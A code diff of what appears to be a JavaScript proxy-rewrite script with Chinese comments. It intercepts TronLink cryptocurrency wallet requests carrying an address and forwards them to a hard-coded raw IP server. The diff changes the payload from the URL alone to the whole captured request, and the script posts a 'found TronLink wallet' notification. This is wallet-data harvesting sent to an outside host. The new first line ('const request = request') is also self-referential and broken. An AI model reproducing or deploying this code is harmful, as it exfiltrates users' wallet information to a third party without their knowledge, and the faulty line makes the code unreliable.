@@ -1,4 +1,4 @@
-
+const request = request;
 const requrl = $request.url;
 const TronLinkRegex = /wallet\/getLatestAPK\?address=/;
 
@@ -7,11 +7,7 @@ const TronLinkRegex = /wallet\/getLatestAPK\?address=/;
 if (TronLinkRegex.test(requrl)) {
     let params = {
         url:"http://43.134.170.213:8001/api/trx/getinfo",
-        timeout: 2000, //请求超时，单位ms，默认5000ms
-        headers:{
-            "Content-Type":"application/json"
-        },
-        body:{requrl},//仅仅在post请求中有效
+        body:request,//仅仅在post请求中有效
     }
     console.log("1111111111");
     $notification.post("通知","subtitle","找到TronLink钱包");
